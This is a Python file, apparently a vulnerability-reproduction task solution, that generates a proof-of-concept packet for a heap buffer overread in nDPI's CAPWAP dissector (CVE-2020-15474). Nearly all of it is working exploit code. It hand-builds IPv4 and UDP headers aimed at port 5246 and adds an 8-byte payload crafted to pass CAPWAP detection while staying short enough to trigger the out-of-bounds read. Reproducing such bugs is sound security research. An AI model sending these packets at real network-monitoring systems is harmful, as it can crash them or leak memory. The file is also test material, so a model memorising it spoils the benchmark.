import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap buffer overread
        in the ndpi_search_setup_capwap function (CVE-2020-15474).

        The vulnerability is an out-of-bounds read on `packet->payload[32]`
        without a sufficient length check. To trigger it, we need a packet
        that is identified as CAPWAP but has a payload length less than 33.

        The nDPI CAPWAP detection logic requires a UDP packet on port 5246/5247
        with a payload of at least 8 bytes that satisfies certain header checks.
        We construct a minimal 8-byte payload that passes these checks.

        The final PoC is a 36-byte packet:
        - 20-byte IPv4 header
        - 8-byte UDP header
        - 8-byte crafted CAPWAP payload
        """
        
        def ip_checksum(data: bytes) -> int:
            """
            Calculates the IPv4 header checksum.
            """
            checksum = 0
            # Process data in 16-bit words
            for i in range(0, len(data), 2):
                word = (data[i] << 8) + data[i+1]
                checksum += word
            
            # Add carry-overs
            while checksum >> 16:
                checksum = (checksum & 0xffff) + (checksum >> 16)
            
            # One's complement
            return ~checksum & 0xffff

        # --- IP Header (20 bytes) ---
        # Total length: 20 (IP) + 8 (UDP) + 8 (Payload) = 36 bytes
        ip_total_length = 36
        
        # Construct the header with a zero checksum field to calculate the checksum
        ip_header_no_csum = struct.pack(
            '!BBHHHBBHII',
            0x45,        # Version (4) | IHL (5)
            0x00,        # DSCP, ECN
            ip_total_length, # Total Length
            0,           # Identification
            0x4000,      # Flags (DF) | Fragment Offset
            64,          # TTL
            17,          # Protocol (UDP)
            0,           # Header Checksum (placeholder)
            0x7f000001,  # Source IP (127.0.0.1)
            0x7f000001   # Destination IP (127.0.0.1)
        )
        
        # Calculate checksum and construct the final header
        checksum = ip_checksum(ip_header_no_csum)
        ip_header = struct.pack(
            '!BBHHHBBHII',
            0x45, 0x00, ip_total_length, 0, 0x4000, 64, 17,
            checksum,
            0x7f000001, 0x7f000001
        )

        # --- UDP Header (8 bytes) ---
        # Length: 8 (UDP Header) + 8 (Payload) = 16 bytes
        udp_length = 16
        udp_header = struct.pack(
            '!HHHH',
            12345,       # Source Port
            5246,        # Destination Port (CAPWAP Control)
            udp_length,  # Length
            0            # Checksum (optional)
        )

        # --- CAPWAP Payload (8 bytes) ---
        # This payload satisfies the detection conditions in `ndpi_search_capwap`
        # but is shorter than 33 bytes, triggering the OOB read.
        # payload_len = 8 >= 8
        # (payload[0] & 0xf8) == 0 -> payload[0] = 0x00
        # HLEN = (((0x00&0x07)<<2) | ((0x80&0xc0)>>6)) * 4 = 8
        # payload_len >= HLEN -> 8 >= 8 is true.
        payload = b'\x00\x80' + b'\x00' * 6

        return ip_header + udp_header + payload